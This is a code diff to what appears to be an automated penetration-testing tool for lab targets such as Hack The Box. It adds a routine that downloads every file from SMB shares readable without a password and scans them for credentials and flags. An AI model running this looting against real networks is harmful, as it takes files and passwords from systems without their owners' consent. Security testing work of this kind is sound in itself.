@@ -11,6 +11,7 @@ import re
 
 from ...core import utils, tooling
 from ...core.report import HostReport, Finding
+from .. import crack
 
 
 def enrich(host: HostReport, port: int) -> None:
@@ -110,7 +111,8 @@ def port_of(host: HostReport) -> int:
 
 
 def _null_read_check(host: HostReport, ip: str, port: int, shares) -> None:
-    interesting = [s for s in shares if s.upper() not in ("IPC$", "PRINT$")]
+    skip = ("IPC$", "PRINT$", "ADMIN$", "C$", "SYSVOL", "NETLOGON")
+    interesting = [s for s in shares if s.upper() not in skip]
     for share in interesting[:8]:
         rc, out, err = utils.run(
             ["smbclient", "-N", f"//{ip}/{share}", "-c", "ls"], timeout=25)
@@ -123,6 +125,22 @@ def _null_read_check(host: HostReport, ip: str, port: int, shares) -> None:
                 severity="high", category="service", port=port, service="smb",
                 evidence=out[:400],
             ))
+            _loot_share(host, ip, port, share)
+
+
+def _loot_share(host: HostReport, ip: str, port: int, share: str, cred=None) -> None:
+    """Recursively download a readable share and scan every file for creds/flags
+    (config files, .dtsConfig, web.config, backups). This is the classic Windows
+    foothold — HTB Archetype's backups share hides prod.dtsConfig with the MSSQL
+    password."""
+    import os
+    dest = os.path.join(crack.loot_dir(host), "smb", re.sub(r"\W+", "_", share))
+    os.makedirs(dest, exist_ok=True)
+    auth = ["-U", f"{cred[0]}%{cred[1]}"] if cred else ["-N"]
+    script = f"lcd {dest}; prompt OFF; recurse ON; mget *"
+    utils.log("info", f"looting //{ip}/{share} -> {dest}", indent=3)
+    utils.run(["smbclient"] + auth + [f"//{ip}/{share}", "-c", script], timeout=120)
+    crack.scan_dir(host, dest, port=port, service="smb")
 
 
 def _rpc_users(host: HostReport, ip: str, port: int) -> None:
